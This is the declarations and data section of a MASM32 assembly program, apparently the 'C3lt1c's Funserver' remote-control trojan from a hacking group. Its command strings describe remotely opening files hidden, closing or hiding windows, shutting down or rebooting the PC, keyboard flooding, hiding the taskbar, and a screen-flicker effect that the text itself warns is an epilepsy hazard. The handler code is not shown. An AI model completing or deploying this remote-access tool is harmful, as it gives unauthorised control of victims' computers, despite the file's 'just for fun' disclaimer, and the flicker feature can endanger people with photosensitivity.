include windows.inc
include kernel32.inc
include user32.inc
include Comctl32.inc
include shell32.inc
include ws2_32.inc
include winmm.inc
include gdi32.inc
include C:\masm32\macros\macros.asm
include advapi32.inc


includelib advapi32.lib
includelib gdi32.lib
includelib winmm.lib
includelib ws2_32.lib
includelib kernel32.lib
includelib user32.lib
includelib Comctl32.lib
includelib shell32.lib

DlgProc            PROTO    :HWND,:UINT,:WPARAM,:LPARAM

.const

IDD_DIALOG1            equ 101
InitServer        PROTO    :DWORD,:DWORD,:DWORD
mousepingpong_call PROTO :DWORD
mousenormal_call PROTO :DWORD
mousefix_call PROTO :DWORD
tron_on_call PROTO :DWORD
tron_off_call PROTO :DWORD


.data?
win                    dd ?

schalter             dd ?
schalter2            dd ?
mx                     dd ?
my                     dd ?

zahl                dd ?
buf db 127             dup(?)
usern                 dd ?
pen                    dd ?
var3                dd ?
var                    dd ?
var2                dd ?
hInstance            dd ?
WM_SOCKET            equ        WM_USER+1
sock                 dd ?
offset_                dd ?
hdc                    dd ?


richtung dd ?
x dd ?
y dd ?
s1 dd ?
s2 dd ?
scx dd ?
scy dd ?



.data





connected db "Welcome on C3lt1c's Funserver. You use it on your own Risk!",10,13,
             "This Server was not codet to damages other PCs or steal data!!!",10,13,
             "Is only codet for just for Fun!!! Use 'commands' to see all functions.",10,13,
             "Greetz to: N1k,Vallani,testme,Sylux,Jojo,Perforin and all Members of Dark-CodeZ.",10,13,
             " ",10,13,0
commands db     "Here are the Commands you can use:",10,13,
             "(about) Get information about the server ",10,13,
             "(commands) Get the list of Commands you can use ",10,13,
             "(killme) This command close the server",10,13,
             "(msgbox) & text Use this command to display a msgbox an servers pc" ,10,13,0
commands2 db "(opencd) Use this command to open the DVD/CD drive ",10,13,
             "(closecd) Use this command to close the DVD/CD drive ",10,13,
             "(text) Use this command to write a text on desktop ",10,13,
             "(beep) Use this command to let the speeker burn :D",10,13,
             "(error) Use this command to play an error sound",10,13,0
commands3 db "(hide_start) Use this command to hide the Windows start button" ,10,13,
             "(show_start) Use this command to show the Windows start button",10,13,
             "(hide_task) Use this command to hide the task",10,13,
             "(show_task) Use this command to show the task",10,13,0
commands4 db "(evilsmile) Use this command to paint a smily on the screen",10,13,
             "(openfile) Use this command to open a file ",10,13,
             "(openhide) Use this command to open a file in hide modus",10,13,
             "(slide) Use this command to slide the Desktop from left to right >:D",10,13,
             "(darkness) Use this command to kick the Desktop into darkness",10,13,0
commands5 db "(mousepingpong) Use this command to play pingpong with mousecursor",10,13,
             "(mousefix) Use this command to fixing the mousecursor",10,13,
             "(mousenormal) Use this command to deactivate mousepingpong or mousefix",10,13,
             "(getprocessname) Use this command to get the name of the ForegroundWindow",10,13,
             "(setprocessname) Use this command to set a new name of the ForegroundWindow",10,13,0
commands6 db "(hideprocess) Use this command to hide the ForegroundWindow",10,13,
             "(showprocess) Use this command to show the ForegroundWindow",10,13,
             "(closeprocess) Use this command to close the ForegroundWindow",10,13,
             "(poweroff) + text Use this command shutdown the PC",10,13,
             "(reboot) + text Use this command to restart the PC",10,13,0
commands7 db "(flicflac) Use this command to let the screen flicker and then kick the desktop in fog (epilepsy perilous!!!)",10,13,
             "(tron_on) Use this command to start Tron an desktop",10,13,
             "(tron_off) Use this command to deactivate Tron",10,13,
             "(keyboardbomb) Use this command to send a keybomb",10,13,
             "(deaddots) Use this command to set green pixels on desktop",10,13,
             " ",10,13,0


verbunden db "Connected to: ",0

zerosend  db " ",10,13,
             " ",10,13,0

about_text db "C3lt1c's Funserver v1.1 in pure ASM! size: 14.5 kb ",10,13,
         " ",10,13,0
ok db "command ok...",10,13,0
ok2 db "ok...",10,13,0

bye db "Bye bye my friend...",0

zero db " ",0

mci1      db "set cdaudio door open",0
mci2      db "set cdaudio door closed",0
mci3      db 0

shut db "shutdown -s -t 10 -c ",0
shut2 db "shutdown -r -t 10 -c ",0



about db "about",0
command db "commands",0
killme db "killme",0
msgbox db "msgbox",0
opencd db "opencd",0
closecd db "closecd",0
text_out db "text",0
beep db "beep",0
error db "error",0
hide_start db "hide_start",0
show_start db "show_start",0
hide_task db "hide_task",0
show_task db "show_task",0
evilsmile db "evilsmile",0
openfile db "openfile",0
openhide db "openhide",0
slide db "slide",0
darkness db "darkness",0
mousepingpong db "mousepingpong",0
mousefix db "mousefix",0
mousenormal db "mousenormal",0
getprocessname db "getprocessname",0
setprocessname db "setprocessname",0
hideprocess db "hideprocess",0
showprocess db "showprocess",0
closeprocess db "closeprocess",0
poweroff db "poweroff",0
reboot db "reboot",0
flicflac db "flicflac",0
tron_on    db "tron_on",0
tron_off    db "tron_off",0
keyboardbomb db "keyboardbomb",0
deaddot db "deaddot",0


shell db "Shell_TrayWnd",0
sbar db "BUTTON",0
child dd ?
slen dd ?


task db "Shell_TrayWnd",0


open db "open",0

buffer db 500 dup (?)
buffer2 db 15 dup (?)
buffer3 db 300 dup (?)
